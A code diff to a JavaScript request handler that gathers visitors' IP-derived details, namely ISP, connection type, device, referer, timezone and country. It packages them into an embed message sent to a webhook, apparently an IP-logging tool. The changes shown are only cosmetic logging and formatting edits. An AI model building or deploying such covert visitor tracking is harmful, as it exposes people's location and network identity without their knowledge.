@@ -10,12 +10,10 @@ async function sendToWebhook(message) {
             body: JSON.stringify(message),
         });
 
-        // Log response status and check for errors
         if (!response.ok) {
-            const errorText = await response.text();
-            console.error(`Failed to send data to webhook. Status: ${response.status}. Response: ${errorText}`);
+            console.error(`Failed to send data to webhook. Status: ${response.status}`);
         } else {
-            console.log("Successfully sent data to webhook.");
+            console.log("Data sent to webhook successfully.");
         }
     } catch (error) {
         console.error("Failed to send data to webhook:", error);
@@ -112,11 +110,9 @@ export default async function handler(req, res) {
         const referer = req.headers['referer'] || 'No referer';
         
         const deviceDetails = detectDeviceDetails(userAgent);
-
         const connectionType = ipDetails.isp?.includes('Fiber') ? 'Fiber' :
                                ipDetails.isp?.includes('DSL') ? 'DSL' :
                                ipDetails.isp?.includes('Cable') ? 'Cable' : 'Unknown';
-
         const timezoneOffset = new Date().getTimezoneOffset() / -60;
 
         const message = {
@@ -155,7 +151,7 @@ export default async function handler(req, res) {
                         { name: "Hosting", value: `\`${ipDetails.hosting ? "Yes" : "No"}\``, inline: true },
                         { name: "Connection Type", value: `\`${connectionType}\``, inline: true },
                         { name: "Local Time Offset", value: `\`${timezoneOffset} hours\``, inline: true },
-                        { name: "Currency (Approx)", value: `\`${ipDetails.countryCode === 'US' ? 'USD' : ipDetails.countryCode === 'EU' ? 'EUR' : 'Unknown'}\``, inline: true },
+                        { name: "Currency (Approx)", value: `\`${ipDetails.countryCode === 'US' ? 'USD' : ipDetails.countryCode === 'EU' ? 'EUR' : 'Unknown'}\``, inline: true }
                     ]
                 }
             ]
